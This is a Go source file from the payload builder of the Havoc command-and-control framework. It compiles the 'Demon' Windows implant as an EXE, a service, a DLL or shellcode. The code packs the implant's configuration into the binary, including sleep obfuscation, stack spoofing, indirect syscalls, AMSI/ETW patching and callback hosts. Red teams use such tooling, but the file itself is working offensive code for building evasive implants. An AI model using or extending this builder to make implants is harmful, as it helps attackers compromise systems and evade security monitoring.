package builder

import (
	"bytes"
	//"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"

	"Havoc/pkg/common"
	"Havoc/pkg/common/packer"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/profile"
	"Havoc/pkg/utils"
	"Havoc/pkg/win32"
)

// TODO: move to agent package
const (
	PayloadDir = "payloads"
)

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
)

const (
	SLEEPOBF_NO_OBF  = 0
	SLEEPOBF_EKKO    = 1
	SLEEPOBF_ZILEAN  = 2
	SLEEPOBF_FOLIAGE = 3
)

const (
	PROXYLOADING_NONE             = 0
	PROXYLOADING_RTLREGISTERWAIT  = 1
	PROXYLOADING_RTLCREATETIMER   = 2
	PROXYLOADING_RTLQUEUEWORKITEM = 3
)

const (
	AMSIETW_PATCH_NONE   = 0
	AMSIETW_PATCH_HWBP   = 1
	AMSIETW_PATCH_MEMORY = 2
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86 = 2
)

type BuilderConfig struct {
	Compiler64 string
	Compiler86 string
	Nasm       string
}

type Builder struct {
	buildSource bool
	sourcePath  string
	debugMode   bool
	silent      bool

	Payloads []string

	FilesCreated []string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int
	}

	config struct {
		Arch           int
		ListenerType   int
		ListenerConfig any
		Config         map[string]any
	}

	ImplantOptions struct {
		Config []byte
	}

	compilerOptions struct {
		Config BuilderConfig

		SourceDirs  []string
		IncludeDirs []string
		CFlags      []string
		Defines     []string

		Main struct {
			Demon string
			Dll   string
			Exe   string
			Svc   string
		}
	}

	outputPath string
	preBytes   []byte

	SendConsoleMessage func(MsgType, Message string)
}

func NewBuilder(config BuilderConfig) *Builder {
	var builder = new(Builder)

	builder.sourcePath = utils.GetTeamserverPath() + "/" + PayloadDir + "/Demon"
	builder.config.Arch = ARCHITECTURE_X64

	builder.compilerOptions.SourceDirs = []string{
		"Source/Core",
		"Source/Crypt",
		"Source/Inject",
		"Source/Loader",
		"Source/Asm",
	}

	builder.compilerOptions.IncludeDirs = []string{
		"Include",
	}

	builder.compilerOptions.CFlags = []string{
		"",
		"-Os -fno-asynchronous-unwind-tables -masm=intel",
		"-fno-ident -fpack-struct=8 -falign-functions=1",
		"-s -ffunction-sections -falign-jumps=1 -w",
		"-falign-labels=1 -fPIC",
		"-Wl,-s,--no-seh,--enable-stdcall-fixup",
	}

	builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"
	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
	builder.compilerOptions.Main.Svc = "Source/Main/MainSvc.c"

	builder.compilerOptions.Config = config

	builder.PatchBinary = false

	return builder
}

func (b *Builder) DebugMode(enable bool) {
	logger.Debug(fmt.Sprintf("Payload Builder: Enable Debug Mode %v", enable))
	b.debugMode = enable
}

func (b *Builder) SetSilent(silent bool) {
	b.silent = silent
}

func (b *Builder) Build() bool {
	var (
		CompileCommand string
		AsmObj         string
	)

	if b.config.ListenerType == handlers.LISTENER_EXTERNAL {
		b.SendConsoleMessage("Error", "External listeners are not support for payload build")
		b.SendConsoleMessage("Error", "Use SMB listener")
		return false
	}

	if !b.silent {
		b.SendConsoleMessage("Info", "starting build")
	}

	Config, err := b.PatchConfig()
	if err != nil {
		b.SendConsoleMessage("Error", err.Error())
		return false
	}

	if !b.silent {
		b.SendConsoleMessage("Info", fmt.Sprintf("config size [%v bytes]", len(Config)))
	}

	//logger.Debug("len(Config) = ", len(Config))
	array := "{"
	for i := range Config {
		if i == (len(Config) - 1) {
			array += fmt.Sprintf("0x%02x", Config[i])
		} else {
			array += fmt.Sprintf("0x%02x\\,", Config[i])
		}
	}
	array += "}"
	//logger.Debug("array = " + array)

	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+array)

	// enable debug mode
	if b.debugMode {
		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
	} else {
		if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
			b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
		} else {
			b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
		}
	}

	// add compiler
	if b.config.Arch == ARCHITECTURE_X64 {
		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler64)

		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", fmt.Sprintf("failed to resolve x64 compiler path: %v", err))
				return false
			}
		}
		b.compilerOptions.Config.Compiler64 = abs

		CompileCommand += "\"" + b.compilerOptions.Config.Compiler64 + "\" "
	} else {
		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler86)

		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", fmt.Sprintf("failed to resolve x86 compiler path: %v", err))
				return false
			}
		}
		b.compilerOptions.Config.Compiler86 = abs

		CompileCommand += "\"" + b.compilerOptions.Config.Compiler86 + "\" "
	}

	// add sources
	for _, dir := range b.compilerOptions.SourceDirs {
		files, err := os.ReadDir(b.sourcePath + "/" + dir)
		if err != nil {
			logger.Error(err)
		}

		for _, f := range files {
			var FilePath = dir + "/" + f.Name()

			// only add the assembly if the demon is x64
			if path.Ext(f.Name()) == ".asm" {
				if (strings.Contains(f.Name(), ".x64.") && b.config.Arch == ARCHITECTURE_X64) || (strings.Contains(f.Name(), ".x86.") && b.config.Arch == ARCHITECTURE_X86) {
					AsmObj = "/tmp/" + utils.GenerateID(10) + ".o"
					var AsmCompile string
					if b.config.Arch == ARCHITECTURE_X64 {
						AsmCompile = fmt.Sprintf(b.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
					} else {
						AsmCompile = fmt.Sprintf(b.compilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
					}
					logger.Debug(AsmCompile)
					b.FilesCreated = append(b.FilesCreated, AsmObj)
					b.Cmd(AsmCompile)
					CompileCommand += AsmObj + " "
				}
			} else if path.Ext(f.Name()) == ".c" {
				CompileCommand += FilePath + " "
			}
		}
	}
	CompileCommand += "Source/Demon.c "

	// add include directories
	for _, dir := range b.compilerOptions.IncludeDirs {
		CompileCommand += "-I" + dir + " "
	}

	// add cflags
	CompileCommand += strings.Join(b.compilerOptions.CFlags, " ")

	// add defines
	b.compilerOptions.Defines = append(b.compilerOptions.Defines, b.GetListenerDefines()...)
	for _, define := range b.compilerOptions.Defines {
		CompileCommand += " -D" + define + " "
	}

	switch b.FileType {
	case FILETYPE_WINDOWS_EXE:
		logger.Debug("Compile exe")
		if b.config.Arch == ARCHITECTURE_X64 {
			CompileCommand += "-D MAIN_THREADED -e WinMain "
		} else {
			CompileCommand += "-D MAIN_THREADED -e _WinMain "
		}
		CompileCommand += b.compilerOptions.Main.Exe + " "
		break

	case FILETYPE_WINDOWS_SERVICE_EXE:
		logger.Debug("Compile Service exe")
		if b.config.Arch == ARCHITECTURE_X64 {
			CompileCommand += "-D MAIN_THREADED -D SVC_EXE -lntdll -e WinMain "
		} else {
			CompileCommand += "-D MAIN_THREADED -D SVC_EXE -lntdll -e _WinMain "
		}
		CompileCommand += b.compilerOptions.Main.Svc + " "
		break

	case FILETYPE_WINDOWS_DLL:
		logger.Debug("Compile dll")
		if b.config.Arch == ARCHITECTURE_X64 {
			CompileCommand += "-shared -e DllMain "
		} else {
			CompileCommand += "-shared -e _DllMain "
		}
		CompileCommand += b.compilerOptions.Main.Dll + " "
		break

	case FILETYPE_WINDOWS_RAW_BINARY:
		logger.Debug("Compile dll and prepend shellcode to it.")

		DllPayload := NewBuilder(b.compilerOptions.Config)
		DllPayload.SetSilent(true)
		DllPayload.ClientId = b.ClientId
		DllPayload.SendConsoleMessage = b.SendConsoleMessage
		DllPayload.config.Config = b.config.Config
		DllPayload.SetArch(b.config.Arch)
		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
		DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
		DllPayload.SetOutputPath("/tmp/" + utils.GenerateString(5, 15) + ".dll")
		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")

		b.SendConsoleMessage("Info", "compiling core dll...")
		if DllPayload.Build() {

			logger.Debug("Successful compiled Dll")
			var (
				ShellcodePath   string
				DllPayloadBytes []byte
				Shellcode       []byte
			)

			DllPayloadBytes = DllPayload.GetPayloadBytes()

			DllPayload.DeletePayload()

			b.SendConsoleMessage("Info", fmt.Sprintf("compiled core dll [%v bytes]", len(DllPayloadBytes)))

			if b.config.Arch == ARCHITECTURE_X64 {
				ShellcodePath = utils.GetTeamserverPath() + "/" + PayloadDir + "/Shellcode.x64.bin"
			} else {
				ShellcodePath = utils.GetTeamserverPath() + "/" + PayloadDir + "/Shellcode.x86.bin"
			}

			ShellcodeTemplate, err := os.ReadFile(ShellcodePath)
			if err != nil {
				logger.Error("Couldn't read content of file: " + err.Error())
				b.SendConsoleMessage("Error", "couldn't read content of file: "+err.Error())
				return false
			}

			Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
			b.SendConsoleMessage("Info", fmt.Sprintf("shellcode payload [%v bytes]", len(Shellcode)))

			b.preBytes = Shellcode

			return true
		}
		break

	}

	CompileCommand += "-o " + b.outputPath

	if !b.silent {
		b.SendConsoleMessage("Info", "compiling source")
	}

	//logger.Debug(CompileCommand)
	Successful := b.CompileCmd(CompileCommand)

	return Successful
}

func (b *Builder) SetListener(Type int, Config any) {
	b.config.ListenerType = Type
	b.config.ListenerConfig = Config
}

func (b *Builder) SetPatchConfig(Config any) {
	logger.Debug("Set Patch config from Profile")
	if Config != nil {
		b.PatchBinary = true
		b.ProfileConfig.MagicMzX64 = Config.(*profile.HeaderBlock).MagicMzX64
		b.ProfileConfig.MagicMzX86 = Config.(*profile.HeaderBlock).MagicMzX86
		b.ProfileConfig.ImageSizeX64 = Config.(*profile.HeaderBlock).ImageSizeX64
		b.ProfileConfig.ImageSizeX86 = Config.(*profile.HeaderBlock).ImageSizeX86
	}
}

func (b *Builder) SetFormat(Format int) {
	b.FileType = Format
}

func (b *Builder) SetArch(Arch int) {
	b.config.Arch = Arch
}

func (b *Builder) SetConfig(Config string) error {

	err := json.Unmarshal([]byte(Config), &b.config.Config)
	if err != nil {
		logger.Error("Failed to Unmarshal json to object: " + err.Error())
		b.SendConsoleMessage("Error", "failed to Unmarshal json to object: "+err.Error())
		return err
	}

	return nil
}

func (b *Builder) SetOutputPath(path string) {
	b.outputPath = path
}

func (b *Builder) GetOutputPath() string {
	return b.outputPath
}

func (b *Builder) Patch(ByteArray []byte) []byte {

	if b.config.Arch == ARCHITECTURE_X64 {
		if b.ProfileConfig.MagicMzX64 != "" {
			for i := range b.ProfileConfig.MagicMzX64 {
				ByteArray[i] = b.ProfileConfig.MagicMzX64[i]
			}
		}
	} else {
		if b.ProfileConfig.MagicMzX86 != "" {
			for i := range b.ProfileConfig.MagicMzX86 {
				ByteArray[i] = b.ProfileConfig.MagicMzX86[i]
			}
		}
	}

	return ByteArray
}

func (b *Builder) PatchConfig() ([]byte, error) {
	var (
		DemonConfig        = packer.NewPacker(nil, nil)
		ConfigSleep        int
		ConfigJitter       int
		ConfigAlloc        int
		ConfigExecute      int
		ConfigSpawn64      string
		ConfigSpawn32      string
		ConfigObfTechnique int
		ConfigProxyLoading = PROXYLOADING_NONE
		ConfigStackSpoof   = win32.FALSE
		ConfigSyscall      = win32.FALSE
		ConfigAmsiPatch    = AMSIETW_PATCH_NONE
		err                error
	)

	logger.Debug(b.config.Config)

	if val, ok := b.config.Config["Sleep"].(string); ok {
		ConfigSleep, err = strconv.Atoi(val)
		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", "failed to convert Sleep string to int: "+err.Error())
			}
			return nil, err
		}
	}

	if val, ok := b.config.Config["Jitter"].(string); ok {
		ConfigJitter, err = strconv.Atoi(val)
		if err != nil {
			if !b.silent {
				b.SendConsoleMessage("Error", "failed to convert Jitter string to int: "+err.Error())
			}
			return nil, err
		}
		if ConfigJitter < 0 || ConfigJitter > 100 {
			return nil, errors.New("Jitter has to be between 0 and 100")
		}
	} else {
		b.SendConsoleMessage("Info", "jitter not found?")
		ConfigJitter = 0
	}

	if val, ok := b.config.Config["Indirect Syscall"].(bool); ok {
		if val {
			ConfigSyscall = win32.TRUE
			if !b.silent {
				b.SendConsoleMessage("Info", "indirect syscalls has been enabled")
			}
		}
	}

	if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
		if val, ok := b.config.Config["Service Name"].(string); ok {
			if len(val) > 0 {
				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
				if !b.silent {
					b.SendConsoleMessage("Info", "set service name to "+val)
				}
			} else {
				val = common.RandomString(6)
				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
				if !b.silent {
					b.SendConsoleMessage("Info", "service name not specified... using random name")
					b.SendConsoleMessage("Info", "set service name to "+val)
				}
			}
		}
	}

	// Demon Config
	DemonConfig.AddInt(ConfigSleep)
	DemonConfig.AddInt(ConfigJitter)

	if Injection := b.config.Config["Injection"].(map[string]any); len(Injection) > 0 {

		if val, ok := Injection["Alloc"].(string); ok && len(val) > 0 {
			switch val {
			case "Win32":
				ConfigAlloc = 1
				break

			case "Native/Syscall":
				ConfigAlloc = 2
				break

			default:
				ConfigAlloc = 0
				break
			}
		} else {
			return nil, errors.New("Injection Alloc is undefined")
		}

		if val, ok := Injection["Execute"].(string); ok && len(val) > 0 {
			switch val {
			case "Win32":
				ConfigExecute = 1
				break

			case "Native/Syscall":
				ConfigExecute = 2
				break

			default:
				ConfigExecute = 0
				break
			}
		} else {
			return nil, errors.New("Injection Execute is undefined")
		}

		if val, ok := Injection["Spawn64"].(string); ok && len(val) > 0 {
			ConfigSpawn64 = val
		} else {
			return nil, errors.New("Injection Spawn64 is undefined")
		}

		if val, ok := Injection["Spawn32"].(string); ok && len(val) > 0 {
			ConfigSpawn32 = val
		} else {
			return nil, errors.New("injection Spawn32 is undefined")
		}
	} else {
		return nil, errors.New("injection is undefined")
	}

	if val, ok := b.config.Config["Sleep Technique"].(string); ok && len(val) > 0 {
		switch val {
		case "WaitForSingleObjectEx":
			ConfigObfTechnique = SLEEPOBF_NO_OBF
			if !b.silent {
				b.SendConsoleMessage("Info", "no sleep obfuscation has been specified")
			}
			break

		case "Foliage":
			ConfigObfTechnique = SLEEPOBF_FOLIAGE
			if !b.silent {
				b.SendConsoleMessage("Info", "sleep obfuscation \"Foliage\" has been specified")
			}
			break

		case "Ekko":
			ConfigObfTechnique = SLEEPOBF_EKKO
			if !b.silent {
				b.SendConsoleMessage("Info", "sleep obfuscation \"Ekko\" has been specified")
			}
			break

		case "Zilean":
			ConfigObfTechnique = SLEEPOBF_ZILEAN
			if !b.silent {
				b.SendConsoleMessage("Info", "sleep obfuscation \"Zilean\" has been specified")
			}
			break

		default:
			ConfigObfTechnique = SLEEPOBF_NO_OBF
			if !b.silent {
				b.SendConsoleMessage("Info", "no sleep obfuscation has been specified")
			}
			break
		}
	} else {
		return nil, errors.New("sleep Obfuscation technique is undefined")
	}

	if val, ok := b.config.Config["Stack Duplication"].(bool); ok {
		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
			if val {
				ConfigStackSpoof = win32.TRUE
				if !b.silent {
					b.SendConsoleMessage("Info", "stack duplication has been specified")
				}
			}
		} else {
			// if no sleep obfuscation technique has been specified then
			// stack spoofing is not possible during sleep lol.
			if !b.silent {
				b.SendConsoleMessage("Info", "stack duplication option ignored")
			}
		}
	} else {
		return nil, errors.New("sleep Obfuscation technique is undefined")
	}

	if val, ok := b.config.Config["Proxy Loading"].(string); ok && len(val) > 0 {
		switch val {
		case "None (LdrLoadDll)":
			ConfigProxyLoading = PROXYLOADING_NONE
			if !b.silent {
				b.SendConsoleMessage("Info", "no proxy loading technique specified (using LdrLoadDll)")
			}
			break

		case "RtlRegisterWait":
			ConfigProxyLoading = PROXYLOADING_RTLREGISTERWAIT
			if !b.silent {
				b.SendConsoleMessage("Info", "proxy loading technique: RtlRegisterWait")
			}
			break

		case "RtlCreateTimer":
			ConfigProxyLoading = PROXYLOADING_RTLCREATETIMER
			if !b.silent {
				b.SendConsoleMessage("Info", "proxy loading technique: RtlCreateTimer")
			}
			break

		case "RtlQueueWorkItem":
			ConfigProxyLoading = PROXYLOADING_RTLQUEUEWORKITEM
			if !b.silent {
				b.SendConsoleMessage("Info", "proxy loading technique: RtlQueueWorkItem")
			}
			break

		default:
			ConfigProxyLoading = PROXYLOADING_NONE
			if !b.silent {
				b.SendConsoleMessage("Info", "no proxy loading technique specified (using LdrLoadDll)")
			}
			break
		}
	} else {
		return nil, errors.New("sleep Obfuscation technique is undefined")
	}

	if val, ok := b.config.Config["Amsi/Etw Patch"].(string); ok && len(val) > 0 {
		switch val {

		case "Hardware breakpoints":
			ConfigAmsiPatch = AMSIETW_PATCH_HWBP
			if !b.silent {
				b.SendConsoleMessage("Info", "amsi/etw patching technique: hardware breakpoints")
			}
			break

		default:
			ConfigAmsiPatch = AMSIETW_PATCH_NONE
			if !b.silent {
				b.SendConsoleMessage("Info", "amsi/etw patching disabled")
			}
			break
		}
	} else {
		return nil, errors.New("sleep Obfuscation technique is undefined")
	}

	// behaviour configuration (alloc/exec/spawn)
	DemonConfig.AddInt(ConfigAlloc)
	DemonConfig.AddInt(ConfigExecute)
	DemonConfig.AddWString(ConfigSpawn64)
	DemonConfig.AddWString(ConfigSpawn32)

	// bypass techniques
	DemonConfig.AddInt(ConfigObfTechnique)
	DemonConfig.AddInt(ConfigStackSpoof)
	DemonConfig.AddInt(ConfigProxyLoading)
	DemonConfig.AddInt(ConfigSyscall)
	DemonConfig.AddInt(ConfigAmsiPatch)

	// Listener Config
	switch b.config.ListenerType {
	case handlers.LISTENER_HTTP:
		var (
			Config    = b.config.ListenerConfig.(*handlers.HTTP)
			Port, err = strconv.Atoi(Config.Config.PortConn)
		)

		if Config.Config.PortConn != "" && err != nil {
			return nil, errors.New("Failed to parse the PortConn: " + Config.Config.PortConn)
		} else if Config.Config.PortConn == "" {
			Port, err = strconv.Atoi(Config.Config.PortBind)
			if err != nil {
				return nil, errors.New("Failed to parse the PortBind: " + Config.Config.PortBind)
			}
		}

		DemonConfig.AddInt64(Config.Config.KillDate)

		WorkingHours, err := common.ParseWorkingHours(Config.Config.WorkingHours)
		if err != nil {
			return nil, err
		}

		DemonConfig.AddInt32(WorkingHours)

		switch Config.Config.HostRotation {
		case "round-robin":
			DemonConfig.AddInt(0)
			break

		case "random":
			DemonConfig.AddInt(1)
			break

		default:
			DemonConfig.AddInt(1)
			break
		}

		DemonConfig.AddInt(len(Config.Config.Hosts))
		for _, host := range Config.Config.Hosts {
			var HostPort []string

			logger.Debug(fmt.Sprintf("Host => %v", host))

			HostPort = strings.Split(host, ":")
			host = HostPort[0]
			if len(HostPort) > 1 {
				/* seems like we specified host:port */
				logger.Debug("host:port")

				var (
					Host = HostPort[0]
					Port int
				)

				if val, err := strconv.Atoi(HostPort[1]); err == nil {
					Port = val
				} else {
					logger.Error("Failed convert Port string to int: " + err.Error())
					return nil, err
				}

				/* Adding Host:Port */
				DemonConfig.AddWString(Host)
				DemonConfig.AddInt(Port)
			} else {
				/* seems like we specified host only. append the listener bind port to it */
				logger.Debug("host only")

				/* Adding Host:Port */
				DemonConfig.AddWString(HostPort[0])
				DemonConfig.AddInt(Port)
			}
		}

		if Config.Config.Secure {
			DemonConfig.AddInt(win32.TRUE)
		} else {
			DemonConfig.AddInt(win32.FALSE)
		}
		DemonConfig.AddWString(Config.Config.UserAgent)

		if len(Config.Config.Headers) == 0 {
			if len(Config.Config.HostHeader) > 0 {
				DemonConfig.AddInt(2)
				DemonConfig.AddWString("Content-type: */*")
				DemonConfig.AddWString("Host: " + Config.Config.HostHeader)
			} else {
				DemonConfig.AddInt(1)
				DemonConfig.AddWString("Content-type: */*")
			}
		} else {
			if len(Config.Config.HostHeader) > 0 {
				Config.Config.Headers = append(Config.Config.Headers, "Host: "+Config.Config.HostHeader)
			}

			DemonConfig.AddInt(len(Config.Config.Headers))
			for _, headers := range Config.Config.Headers {
				logger.Debug(headers)
				DemonConfig.AddWString(headers)
			}
		}

		if len(Config.Config.Uris) == 0 {
			DemonConfig.AddInt(1)
			DemonConfig.AddWString("/")
		} else {
			DemonConfig.AddInt(len(Config.Config.Uris))
			for _, uri := range Config.Config.Uris {
				logger.Debug(uri)
				DemonConfig.AddWString(uri)
			}
		}

		// adding proxy connection info
		if Config.Config.Proxy.Enabled {
			DemonConfig.AddInt(win32.TRUE)
			var ProxyUrl = fmt.Sprintf("%v://%v:%v", Config.Config.Proxy.Type, Config.Config.Proxy.Host, Config.Config.Proxy.Port)

			DemonConfig.AddWString(ProxyUrl)
			DemonConfig.AddWString(Config.Config.Proxy.Username)
			DemonConfig.AddWString(Config.Config.Proxy.Password)
		} else {
			DemonConfig.AddInt(win32.FALSE)
		}

		break

	case handlers.LISTENER_PIVOT_SMB:
		var Config = b.config.ListenerConfig.(*handlers.SMB)

		DemonConfig.AddString("\\\\.\\pipe\\" + Config.Config.PipeName)

		DemonConfig.AddInt64(Config.Config.KillDate)

		WorkingHours, err := common.ParseWorkingHours(Config.Config.WorkingHours)
		if err != nil {
			logger.Error("Failed to parse the WorkingHours: " + err.Error())
			return nil, err
		}

		DemonConfig.AddInt32(WorkingHours)

		break
	}

	//logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))

	return DemonConfig.Buffer(), nil
}

func (b *Builder) GetPayloadBytes() []byte {

	if len(b.preBytes) > 0 {
		b.SendConsoleMessage("Good", "payload generated")
		return b.preBytes
	}

	var (
		FileBuffer []byte
		err        error
	)

	if b.outputPath == "" {
		logger.Error("Output Path is empty")
		if !b.silent {
			b.SendConsoleMessage("Error", "output Path is empty")
		}
		return nil
	}

	FileBuffer, err = os.ReadFile(b.outputPath)
	if err != nil {
		logger.Error("Couldn't read content of file: " + err.Error())
		if !b.silent {
			b.SendConsoleMessage("Error", "couldn't read content of file: "+err.Error())
		}
		return nil
	}

	if b.PatchBinary {
		FileBuffer = b.Patch(FileBuffer)
	}

	if !b.silent {
		b.SendConsoleMessage("Good", "payload generated")
	}

	return FileBuffer
}

func (b *Builder) Cmd(cmd string) bool {
	var (
		Command = exec.Command("sh", "-c", cmd)
		stdout  bytes.Buffer
		stderr  bytes.Buffer
		err     error
	)

	Command.Dir = b.sourcePath
	Command.Stdout = &stdout
	Command.Stderr = &stderr

	err = Command.Run()
	if err != nil {
		logger.Error("Couldn't compile implant: " + err.Error())
		if !b.silent {
			b.SendConsoleMessage("Error", "couldn't compile implant: "+err.Error())
			b.SendConsoleMessage("Error", "compile output: "+stderr.String())
		}
		logger.Debug(cmd)
		logger.Debug("StdErr:\n" + stderr.String())
		return false
	}
	return true
}

func (b *Builder) CompileCmd(cmd string) bool {

	if b.Cmd(cmd) {
		if !b.silent {
			b.SendConsoleMessage("Info", "finished compiling source")
		}
		return true
	}

	return false
}

func (b *Builder) GetListenerDefines() []string {
	var defines []string

	switch b.config.ListenerType {

	case handlers.LISTENER_HTTP:

		defines = append(defines, "TRANSPORT_HTTP")
		break

	case handlers.LISTENER_PIVOT_SMB:

		defines = append(defines, "TRANSPORT_SMB")
		break

	}

	return defines
}

func (b *Builder) DeletePayload() {
	b.FilesCreated = append(b.FilesCreated, b.outputPath)
	for _, FileCreated := range b.FilesCreated {
		if strings.HasSuffix(FileCreated, ".bin") == false {
			if err := os.Remove(FileCreated); err != nil {
				logger.Debug("Couldn't remove " + FileCreated + ": " + err.Error())
			}
		}
	}
}
